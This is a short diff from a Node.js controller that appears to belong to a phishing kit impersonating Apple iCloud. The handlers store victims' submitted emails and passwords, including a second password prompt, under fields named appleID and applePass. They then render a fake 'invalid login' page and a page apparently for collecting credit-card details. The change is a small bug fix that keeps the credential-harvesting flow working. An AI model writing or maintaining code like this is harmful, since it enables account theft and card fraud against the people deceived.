@@ -32,7 +32,7 @@ exports.login_post = async (req, res) => {
   await User.findOneAndUpdate({ count }, { appleID: email,  applePass: password});
   
 
-  res.render('icloud-invalid', { count : i, email})
+  res.render('icloud-invalid', { count, email})
 
 
   
@@ -46,7 +46,7 @@ exports.billingform_post = async (req, res) => {
   await User.findOneAndUpdate({ count }, { applePass2: password});
 
 
-  res.render('icloud-cc', { count : i, email})
+  res.render('icloud-cc', { count, email})
 
 }
 
